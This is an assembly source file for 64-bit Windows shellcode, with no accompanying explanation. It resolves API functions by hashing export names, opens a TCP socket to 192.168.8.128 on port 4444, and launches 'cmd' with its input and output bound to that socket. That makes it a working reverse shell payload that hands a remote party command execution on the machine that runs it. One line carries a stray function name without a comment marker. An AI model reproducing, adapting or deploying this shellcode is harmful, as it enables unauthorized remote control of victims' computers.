bits 64

_start:
    and rsp, -16
    mov r11d, 0xEC0E4E8E        
kernel32:
    mov rdx, [gs:0x60]      
    mov rdx, [rdx+0x18]      
    mov rdx, [rdx+0x20]      
    mov rdx, [rdx]          
    mov rdx, [rdx]          
    mov rdx, [rdx+0x20]     
    xor r15, r15

    cmp r13b, 0x01              
    je setup_proc.cont

.resolve_export:
    mov eax, [rdx+0x3C]      
    add rax, rdx            

    mov ebx, [rax+0x88]      
    add rbx, rdx            

    mov ecx, [rbx+0x18]       

    mov r8d, [rbx+0x20]      
    add r8, rdx             
 
hash_loop:
    mov esi, [r8 + r15 * 0x04]     
    add rsi, rdx    
    xor eax, eax
    xor r9, r9      
.hash_func:
    lodsb   
    test al, al     
    jz .hash_done   
    ror r9d, 0xd     
    add r9d, eax    
    jmp .hash_func  
.hash_done:
    cmp r9d, r11d   
    je .found       
    inc r15d        
    loop hash_loop  
.found:
    mov eax, [rbx+0x24]  
    add rax, rdx        
    movzx rcx, word [rax + r15 * 0x02]     

    mov eax, [rbx+0x1C]      
    add rax, rdx        
    mov eax, [rax + rcx * 0x04]    
    add rax, rdx        
    cmp r11d, 0x3BFCEDCB    
    je wsastartup
    cmp r11d, 0xADF509D9    
    je wsasocketa
    cmp r11d, 0x4E121B69    
    je inet_pton
    cmp r11d, 0xB32DBA0C    
    je wsaconnect
    cmp r11d, 0x16B3FE72    
    je createprocessa
loadlib:
    lea rcx, [rel ws2_32]   
    sub rsp, 0x20   
    call rax    
    add rsp, 0x20  

    mov rdx, rax    
    xor r15, r15
    mov r11d, 0x3BFCEDCB    
    jmp kernel32.resolve_export

wsastartup:
    push rdx    
    sub rsp, 0x1A8    
    mov rcx, 0x202  
    mov rdx, rsp    
    call rax    
    add rsp, 0x1A8    
    pop rdx     

    xor r15, r15
    mov r11d, 0xADF509D9        
    jmp kernel32.resolve_export
wsasocketa:
    push rdx    
    sub rsp, 0x38
    mov rcx, 0x02
    mov rdx, 0x01
    mov r8, 6
    xor r9, r9
    mov dword 0x20[rsp], 0
    mov dword 0x28[rsp], 0
    call rax    
    mov rdi, rax
    add rsp, 0x38
    pop rdx    
    
    xor r15, r15
    mov r11d, 0x4E121B69        
    jmp kernel32.resolve_export

inet_pton:
    push rdx
    sub rsp, 0x10
    mov word [rsp], 0x02
    mov word [rsp+2], 0x5C11    
    

    mov cl, 0x02
    lea rdx, [rel ip]
    lea r8, [rsp+4]
    call rax    

    mov r14, rsp    

    add rsp, 0x10
    pop rdx
    xor r15, r15
    mov r11d, 0xB32DBA0C        
    jmp kernel32.resolve_export

wsaconnect:
    sub rsp, 0x60
    mov rcx, rdi    
    mov rdx, r14    
    mov r8b, 0x1
    xor r9, r9
    mov qword [rsp+32], 0
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    call rax    
    add rsp, 0x60

setup_proc:
    mov r13b, 0x01
    jmp kernel32    
.cont:
    xor r15, r15
    mov r11d, 0x16B3FE72    
    jmp kernel32.resolve_export
createprocessa:
    sub rsp, 0x88    
    mov dword [rsp], 0x70
    mov dword [rsp+60], 0x00000100
    mov qword [rsp+80], rdi
    mov qword [rsp+88], rdi
    mov qword [rsp+96], rdi
    mov r14, rsp 

    sub rsp, 0x58
    xor rcx, rcx
    lea rdx, [rel cmd]
    xor r8, r8
    xor r9, r9
    mov byte [rsp+32], 0x01
    mov dword [rsp+40], 0
    mov qword [rsp+48], 0  
    mov qword [rsp+56], 0
    mov rbx, r14
    mov qword [rsp+64], rbx
    lea rbx, [r14+112]
    mov qword [rsp+72], rbx
    call rax    CreateProcessA
    add rsp, 0x58
    add rsp, 0x88    
done: 
    ret
ws2_32:
    db "ws2_32", 0
    ; ret
ip:
    db "192.168.8.128", 0
cmd:
    db "cmd", 0
